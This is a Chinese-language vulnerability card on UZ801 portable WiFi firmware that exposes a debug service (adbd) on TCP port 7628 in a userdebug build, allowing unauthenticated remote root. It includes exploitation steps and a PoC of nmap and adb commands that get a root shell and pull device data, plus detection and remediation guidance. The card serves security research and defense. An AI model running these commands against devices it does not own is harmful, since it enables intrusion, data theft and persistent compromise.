---
id: mobile-android-adbd-tcp-userdebug-root
title: 随身 WiFi 暴露 adbd TCP 7628 + userdebug 构建免授权 root
type: scenario
domain: mobile
path: mobile/android
technique: exposed-adbd-tcp-userdebug-no-auth-root
aliases:
- adb 7628
- adbd 0.0.0.0
- persist.adb.tcp.port
- userdebug root
- ADB over WiFi 免授权
- 0-click root 随身 WiFi
- Android userdebug 调试后门
- UZ801 adb root
tags:
- android
- adb
- adbd
- userdebug
- remote-root
- embedded-device
- iot
- portable-wifi
- default-insecure
- cve-2026-52199
- cve-2026-52200
cve:
- CVE-2026-52199
- CVE-2026-52200
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: UZ801（FY_UZ801_V2.1）原厂固件，Android 4.4.4、ro.build.type=userdebug、ro.build.display.id=V3.4.3、persist.adb.tcp.port=7628
verification:
  verified_by: verifier-V28
  verified_at: '2026-11-05T03:08:35+08:00'
  notes: 已对照原文与图片核对：build.prop persist.adb.tcp.port=7628、ro.build.type=userdebug、netstat 0.0.0.0:7628 LISTEN、/proc/335/exe=/sbin/adbd、adb connect 后 uid=0(root)；图片01主板型号FY_UZ801_V2.1、04为AjaxSevlet funcNo分发。原文未拆分两个CVE对应项，卡内并列两号已注明；PoC未复现。affected_versions原文明确。
---

## 一句话结论

随身 WiFi 原厂固件把 `persist.adb.tcp.port` 设为 7628，adbd 监听 `0.0.0.0:7628`；同时系统是 `userdebug` 构建，RSA 授权弹窗被关闭，且 adbd 以 root 运行。同一局域网（乃至能路由到 `192.168.100.1`）的任何人都可以 `adb connect` 后直接拿到 root shell，构成 0-click 无密码远程 Root。

## 原理

- `build.prop` 中 `persist.adb.tcp.port=7628` 让 adbd 在 TCP 7628 上监听；`netstat -tulnp` 显示 `0.0.0.0:7628 LISTEN`，即对所有网卡开放，而不只是回环。
- `ro.build.type=userdebug` 与 `ro.build.tags=test-keys` 表明这是工程/调试构建。正常 `user` 构建的 adbd 在首次连接时弹 RSA 授权框，需要用户在设备上点“允许”；userdebug 构建在实验中直接接受连接，没有授权交互。
- 设备上的 adbd 以 root 身份运行（`adb root` 返回 “adbd is already running as root”；`adb shell id` 返回 `uid=0(root)`），因此连接成功即等于 root，不需要额外提权链。
- 端口是固定且可预测的：攻击者只需扫描 5555/7628 等常见 ADB 端口，或从固件/`build.prop` 读取；不需要先登录 Web 后台，也不需要物理接触。
- 设备同时是 Android 4.4.4（API 19）且 32 位 ARM，若 adbd 不是 root，仍有 Dirty COW（CVE-2016-5195）等大量老内核提权路径可用；本场景直接跳过了这一步。
- 根因是“调试能力默认开启并绑定到业务网络”，不是某个 ADB 漏洞：adbd 本身工作正常，问题在于生产固件把调试守护进程暴露给了不可信网络。

## 触发条件

- 设备运行受影响的 userdebug 固件，`persist.adb.tcp.port` 被设置（本例 7628），adbd 监听非回环地址。
- 攻击者能路由到设备的管理/局域网地址（连接随身 WiFi 的客户端、同 LAN 主机，或该端口被映射到公网）。
- 设备未通过防火墙/网络策略阻断 7628，也没有在生产构建中关闭 adbd TCP。
- 攻击者持有 adb 客户端；无需设备端授权弹窗（userdebug 构建）。
- 若设备是 `user` 构建且 `ro.adb.secure=1`，首次连接需要用户确认，本原语不成立。

## 利用步骤

1. 从固件 `build.prop`、端口扫描或默认配置得知 ADB TCP 端口（本例 7628）；也可先扫 5555、5037、7628。
2. 连接设备管理网段（随身 WiFi 默认网关常见 `192.168.100.1`），确认 7628 开放。
3. `adb connect <device-ip>:7628`；userdebug 构建下不需要在设备上点授权。
4. `adb -s <device-ip>:7628 shell`，执行 `id` 确认 `uid=0(root)`。
5. 进一步 `adb root`、`adb pull` 拉取 `/data`、配置、SIM/IMEI 信息，或安装应用、修改系统分区。
6. 若需要持久化，可修改 `/system`、写入 init 脚本或替换应用；本场景已直接具备 root，无需提权。

## PoC

```bash
# 1. 确认端口（在可路由到设备的主机上）
nmap -p 5555,7628 <device-ip>

# 2. 连接并验证 root
adb connect <device-ip>:7628
adb -s <device-ip>:7628 shell id
# uid=0(root) gid=0(root) context=u:r:shell:s0

adb -s <device-ip>:7628 root
# adbd is already running as root

# 3. 取证/利用示例
adb -s <device-ip>:7628 shell getprop ro.build.type      # userdebug
adb -s <device-ip>:7628 shell getprop persist.adb.tcp.port  # 7628
adb -s <device-ip>:7628 pull /data/local/tmp/ /tmp/loot/
```

```text
设备侧对照：
netstat -tulnp | grep 7628
tcp 0 0 0.0.0.0:7628 0.0.0.0:* LISTEN
/proc/<pid>/exe -> /sbin/adbd
```

## 变体与关联

- 变体（端口）：标准 ADB over WiFi 常用 5555；厂商可自定义任意端口（本例 7628），应从 `build.prop` 的 `persist.adb.tcp.port` 或 `service.adb.tcp.port` 读取。
- 变体（构建类型）：`eng` 构建通常也免授权；`userdebug` 是否弹窗取决于 `ro.adb.secure` 与厂商改动，需实测。
- 变体（无 root adbd）：若 adbd 不以 root 运行，可结合 Android 4.4 内核的 Dirty COW（CVE-2016-5195）等本地提权；但本场景无需。
- 关联：[[web-generic-auth-type-dispatch-unauth-data-exposure]]（同一设备的未授权 funcNo 管理接口，可读取 WiFi 密码/IMEI；本篇因同场景未另建卡）。
- 边界：设备在 `user` 构建且启用 RSA 授权、adbd 仅监听回环、或网络层封锁 7628 时不可利用；公网可达性取决于端口映射。

## 检测与防御

- 资产发现：扫描 5555/7628/5037 等 ADB 端口；读取固件 `build.prop` 的 `persist.adb.tcp.port`、`ro.build.type`、`ro.adb.secure`、`ro.debuggable`。
- 设备检测：`netstat -tulnp` 中 adbd 监听 `0.0.0.0`；`/proc/<pid>/exe -> /sbin/adbd`；异常 adb 连接与 `adb shell` 命令。
- 修复：生产固件改为 `user` 构建，移除 `persist.adb.tcp.port`/`service.adb.tcp.port`，设置 `ro.adb.secure=1`，关闭 adbd 的 TCP 监听，仅保留受控 USB 调试。
- 加固：设备防火墙只允许管理所需端口；ADB 端口不映射到公网；管理网与用户网隔离；对固件做发布前配置审计（build.prop、init.rc、默认服务）。
- 响应：发现暴露 adbd 时立即断网、轮换设备上保存的凭据、检查是否被安装持久化应用或修改系统分区；假设设备已完全失陷。
